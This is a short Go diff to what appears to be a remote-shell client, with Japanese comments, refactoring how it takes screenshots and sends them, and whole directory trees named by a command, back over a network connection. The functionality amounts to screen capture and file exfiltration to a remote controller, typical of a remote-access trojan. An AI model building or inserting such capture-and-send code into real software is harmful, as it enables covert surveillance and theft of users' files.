@@ -58,13 +58,13 @@ func RunShell(conn net.Conn) error {
 			//スクリーンショットを撮影し送信
 			outdir := config.Config.ScreenshotDir
 
-			filenames, err := Getscreenshot(outdir)
+			_, err := Getscreenshot(outdir)
 			if err != nil {
 				log.Println(err)
 				continue
 			}
 
-			err = SendFile(filenames, conn)
+			err = SendFiles(outdir, conn)
 			if err != nil {
 				log.Println(err)
 				continue
@@ -82,7 +82,8 @@ func RunShell(conn net.Conn) error {
 
 			//ファイルシステム構築
 			rootPath := commands[len(commands)-1]
-			err := ExecDownload(rootPath, conn)
+
+			err := SendFiles(rootPath, conn)
 			if err != nil {
 				log.Println(err)
 			}
